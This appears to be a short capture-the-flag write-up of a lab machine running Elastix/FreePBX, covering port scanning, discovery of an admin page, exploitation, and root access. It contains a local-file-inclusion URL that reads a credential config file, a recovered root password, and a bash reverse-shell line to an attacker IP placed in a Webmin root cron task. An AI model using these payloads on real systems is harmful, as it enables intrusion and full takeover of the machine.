# Recon
```
$ nmap -p- --min-rate 10000 10.10.10.7
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-01 17:02 EEST
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 23.48% done; ETC: 17:02 (0:00:13 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.13s latency).
Not shown: 65476 filtered tcp ports (no-response), 49 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
111/tcp  open  rpcbind
143/tcp  open  imap
443/tcp  open  https
993/tcp  open  imaps
995/tcp  open  pop3s
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 18.01 seconds
```
- the webpage cannot be loaded due to Firefox and other browsers changing their min TLS version to a number higher than what the box supports
- Port 80 just returns a redirect to port 443 / HTTPS where there’s an an Elastix login page
- dirb shows us there is an admin page /admin
- going to admin page it asks for authentication
- hiting cancel prompts us to this page https://10.10.10.7/admin/reports.php which provide info like freepx
- searching for exploit for freepbx version and elastix we found a lfi vulun
- poc for lfi
- ```
  https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
  ```
- viewing the page source the page seems readable and found different password but the one i guess is right is this **jEhdIekWmdjE**
- ssh as root with this password some problem with ssh come up
- so i try to go to port 10000 and found a webmin trying root and the password and i got in
- create a task as root in scheduled commands
- ```
  bash -c 'bash -i >& /dev/tcp/10.10.16.5/444 0>&1'
  ```
- and now we go aroot shell

